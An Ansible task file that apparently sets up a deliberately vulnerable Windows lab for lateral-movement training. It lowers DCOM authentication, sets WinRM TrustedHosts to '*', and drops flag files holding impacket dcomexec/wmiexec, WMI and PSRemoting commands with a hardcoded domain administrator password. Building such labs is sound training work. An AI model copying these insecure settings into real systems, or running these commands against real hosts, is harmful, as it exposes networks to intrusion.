---
# ==============================================================================
# vuln_lat_df_extended/tasks/dcom_wmi.yml — LAT-071..100
# DCOM/WMI/RPC/RDP lateral movement surfaces
# ==============================================================================

# LAT-071: DCOM ShellBrowserWindow / MMC20 / ShellWindows exec
- name: LAT-071 - Enable and configure DCOM for lateral movement
  ansible.windows.win_shell: |
    # Enable DCOM (should already be enabled; set DCOM limits)
    $v = (Get-ItemProperty 'HKLM:\Software\Microsoft\OLE' -ErrorAction SilentlyContinue).EnableDCOM
    if ($v -ne 'Y') {
      Set-ItemProperty 'HKLM:\Software\Microsoft\OLE' -Name EnableDCOM -Value 'Y'
      Write-Output "changed: DCOM enabled"
    }
    # Disable DCOM auth — allow unauthenticated DCOM activation
    $lv = (Get-ItemProperty 'HKLM:\Software\Microsoft\OLE' -ErrorAction SilentlyContinue).LegacyAuthenticationLevel
    if ($lv -ne 1) {
      Set-ItemProperty 'HKLM:\Software\Microsoft\OLE' -Name LegacyAuthenticationLevel -Value 1 -Type DWord
      Write-Output "changed: DCOM auth level lowered"
    }
    Write-Output "ok"
  register: lat071_set
  changed_when: "'changed:' in lat071_set.stdout"
  failed_when: lat071_set.rc != 0

# LAT-072: WMI remote exec surface
- name: LAT-072 - Verify WMI service running and accessible
  ansible.windows.win_service:
    name: Winmgmt
    state: started
    start_mode: auto

# LAT-073: WinRM lateral (already used by Ansible — verify listener)
- name: LAT-073 - Verify WinRM HTTP listener for lateral use
  ansible.windows.win_shell: |
    $l = Get-ChildItem WSMan:\localhost\Listener -ErrorAction SilentlyContinue
    if ($l) {
      Write-Output "ok: WinRM listeners configured"
    }
  register: lat073_check
  changed_when: false
  failed_when: lat073_check.rc != 0

# LAT-074: PSRemoting with domain credentials
- name: LAT-074 - Enable PSRemoting with all hosts allowed
  ansible.windows.win_shell: |
    $trusted = (Get-Item WSMan:\localhost\Client\TrustedHosts -ErrorAction SilentlyContinue).Value
    if ($trusted -ne '*') {
      Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
      Write-Output "changed: TrustedHosts set to *"
    }
  register: lat074_set
  changed_when: "'changed:' in lat074_set.stdout"
  failed_when: lat074_set.rc != 0

# LAT-075: RDP as lateral movement channel — NLA disabled (IA-084 already sets this)
# LAT-076: RDP hijacking via tscon (session stealing without credentials)
- name: LAT-075..090 - Drop DCOM and remote exec technique notes
  ansible.windows.win_copy:
    dest: "{{ item.path }}"
    content: "{{ item.content }}"
  loop:
    - path: 'C:\Flags\FLAG-LAT-071-DCOM.txt'
      content: |
        LAT-071..074: DCOM/WMI/WinRM Remote Execution
        ================================================
        DCOM ShellBrowserWindow (lateral exec, no PSExec service install):
          impacket-dcomexec EMPIRE/Administrator:SithLord123!@10.10.0.13 "cmd /c whoami"
          impacket-wmiexec EMPIRE/Administrator:SithLord123!@10.10.0.13 "cmd /c whoami"

        WMI process create:
          Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami" \
            -ComputerName scarif.empire.local -Credential $cred

        PSRemoting:
          Enter-PSSession -ComputerName scarif.empire.local -Credential $cred
          Invoke-Command -ComputerName @('coruscant','scarif','tatooine') -ScriptBlock {whoami}

    - path: 'C:\Flags\FLAG-LAT-076-RDPHijack.txt'
